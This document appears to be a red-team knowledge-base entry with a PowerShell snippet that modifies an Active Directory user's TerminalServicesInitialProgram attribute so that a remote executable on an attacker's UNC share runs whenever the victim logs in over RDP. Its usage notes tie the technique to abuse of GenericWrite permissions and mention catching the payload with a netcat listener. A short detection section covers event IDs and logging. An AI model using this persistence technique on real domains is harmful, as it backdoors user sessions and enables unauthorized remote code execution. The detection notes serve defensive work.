---
id: 4bc1ad1f-77a5-4504-a7ea-83091000be72
name: PowerShell Configure Terminal Services for Persistence
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.779274+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - active-directory
  - rds
validated: true
---

# PowerShell Configure Terminal Services for Persistence

## Code

```powershell
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
$UserObject.TerminalServicesWorkDirectory = "C:\"
$UserObject.SetInfo()
```

## Description

This PowerShell script uses ADSI to bind to an AD user object, sets the TerminalServicesInitialProgram to a remote executable for automatic execution on RDP logon, configures the working directory, and saves the changes. It establishes persistence in RDS environments by leveraging GenericWrite permissions, assuming the target user logs in via Remote Desktop.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld | Distinguished Name (DN) of the target user object to modify | LDAP://CN=targetuser,OU=Users,DC=contoso,DC=com |
| \\1.2.3.4\share\file.exe | UNC path to the malicious executable that will run on logon | \\192.168.1.100\share\backdoor.exe |
| C:\ | Working directory for the executable | C:\Windows\Temp |

## Usage

Execute this script in a PowerShell session on a domain-joined machine with appropriate credentials. Replace the hardcoded DN, UNC path, and directory with environment-specific values before running. This is typically used after gaining GenericWrite via ACL abuse, to create a backdoor triggered by victim RDP logons. Start a listener (e.g., netcat) on the attacker side to catch the payload execution.

## Detection

- Monitor AD replication events (Event ID 5136/5137) for modifications to TerminalServices* attributes.
- Audit PowerShell execution logs (Module/ScriptBlock logging) for ADSI usage and SetInfo() calls.
- Watch for unusual UNC connections from RDS sessions or new processes spawning from rdpclip.exe/similar.
- Use tools like BloodHound to detect GenericWrite permissions on user objects.

## Related

- [[Abuse AD ACLs GenericWrite to Configure RCM Persistence]]
- [[Retrieve ADSI User Object]]
